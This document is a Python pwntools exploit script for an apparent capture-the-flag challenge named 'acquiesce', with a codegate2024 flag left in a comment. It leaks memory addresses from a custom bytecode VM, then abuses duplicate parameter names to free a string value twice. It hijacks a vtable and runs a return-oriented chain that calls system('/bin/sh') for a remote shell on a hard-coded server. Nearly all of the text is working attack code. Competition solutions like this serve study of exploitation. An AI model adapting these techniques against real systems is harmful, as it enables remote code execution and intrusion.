#!/usr/bin/env python3
import struct
from typing import List

from pwn import *


def connect():
    if args.LOCAL:
        if args.GDB:
            return process(["./acquiesce.dbg"])
        else:
            tube = gdb.debug(["./acquiesce.dbg"], api=True)
            # Value destructor call.
            # tube.gdb.execute("b *(&vm__step - 0x2D02 + 0x362A)")
            # str_val allocation.
            # tube.gdb.execute("b *(&vm__step - 0x2D02 + 0x3028)")
            tube.gdb.continue_nowait()
            return tube
    else:
        return remote("13.125.233.68", 4321)


CMD_ASSIGN = 0x10
TAG_INT = 160
TAG_STR = 161
TAG_FUNC = 162
CMD_DUMP_VAR = 0x11
CMD_CALL = 0x12
CMD_RET = 0x13
CMD_EXIT = 0x1E
PROG_SIZE = 0x400


def emit_assign_const_int(prog: bytearray, var_id: int, val: int):
    prog.extend(struct.pack("<BBII", CMD_ASSIGN, TAG_INT, var_id, val))


def emit_assign_str(prog: bytearray, var_id: int, val: bytes):
    prog.extend(struct.pack("<BBII", CMD_ASSIGN, TAG_STR, var_id, len(val)))
    val_reloc = len(prog)
    prog.extend(val)
    return val_reloc


def emit_assign_func(prog: bytearray, var_id: int, pc: int, arg_ids: List[int]):
    prog.extend(struct.pack("<BBI", CMD_ASSIGN, TAG_FUNC, var_id))
    pc_reloc = len(prog)
    prog.extend(struct.pack("<IB", pc, len(arg_ids)))
    for arg_id in arg_ids:
        prog.extend(struct.pack("<I", arg_id))
    return pc_reloc


def emit_dump_var(prog: bytearray, var_id: int):
    prog.extend(struct.pack("<BI", CMD_DUMP_VAR, var_id))


def emit_call(prog: bytearray, var_id: int, arg_ids: List[int]):
    prog.extend(struct.pack("<BI", CMD_CALL, var_id))
    for arg_id in arg_ids:
        prog.extend(struct.pack("<I", arg_id))


def emit_ret(prog: bytearray):
    prog.append(CMD_RET)


def resolve_reloc(prog: bytearray, reloc: int):
    prog[reloc : reloc + 4] = struct.pack("<I", len(prog))


def main():
    with connect() as tube:
        # Leak uninitialized buf.
        prog = bytearray()
        emit_ret(prog)
        tube.sendafter(b">> ", prog)
        leak = tube.recvn(PROG_SIZE)
        assert leak.startswith(prog)
        libstdcxx = -1
        stack = -1
        for i in range(0, (len(leak) + 7) & ~7, 8):
            (leak_q,) = struct.unpack("<Q", leak[i : i + 8])
            print(f"0x{i:x}: 0x{leak_q:x}")
            if leak_q & 0xFFF == 0x398:
                libstdcxx = leak_q - 0x26B398
                (stack,) = struct.unpack("<Q", leak[i + 8 : i + 16])
        print(f"libstdcxx = 0x{libstdcxx:x}")
        assert libstdcxx & 0xFFF == 0
        libc = libstdcxx - 0x23F000
        print(f"libc = 0x{libc:x}")
        assert libc & 0xFFF == 0
        print(f"stack = 0x{stack:x}")
        prog_addr = stack - 0x410
        print(f"prog_addr = 0x{prog_addr:x}")

        # Pwn.
        prog = bytearray()
        # The victim variable. sizeof(val_str) == 0x28.
        emit_assign_str(prog, 0x1111, b"A" * 100)
        # The function with identically named parameters.
        func_reloc = emit_assign_func(prog, 0x2222, 0, [0, 0])
        # Assign the victim's value to both.
        emit_call(prog, 0x2222, [0x1111, 0x1111])
        # Overwrite the victim's vtable.
        # Mind the trailing zero.
        vtable_reloc = emit_assign_str(prog, 0x3333, b"A" * 0x27)
        # The victim is a local variable, so it will be freed via its vtable.
        emit_ret(prog)

        # The helper function.
        resolve_reloc(prog, func_reloc)
        # Drop the frame metadata for both arguments.
        # While at it, clog tcache.
        emit_assign_str(prog, 0, b"")
        # Free the newly created local's and the victim's values.
        emit_ret(prog)

        bin_sh = prog_addr + len(prog)
        prog.extend(b"/bin/sh\0")

        assert prog[0x10:0x28] == b"A" * 0x18
        prog[0x10:0x28] = struct.pack(
            "<QQQ",
            # pop rdi; ret
            libc + 0x10F75B,
            bin_sh,
            # system
            libc + 0x58740,
        )

        # vtable. It has 3 pointers: dtor, dtor_delete and get_tag.
        # We care only about the second one.
        prog[vtable_reloc : vtable_reloc + 8] = struct.pack(
            "<Q", prog_addr + len(prog) - 8
        )
        # add rsp, 0xe8 ; ret
        prog.extend(struct.pack("<Q", libstdcxx + 0x196694))

        prog = prog.ljust(PROG_SIZE, b"\x00")
        tube.sendafter(b">> ", prog)
        assert tube.recvn(PROG_SIZE) == prog
        tube.interactive()

        # codegate2024{d8e5d75bc5c57d81e0f6835489d95e08fe534251432faef231a81a054dacaf95}


if __name__ == "__main__":
    main()
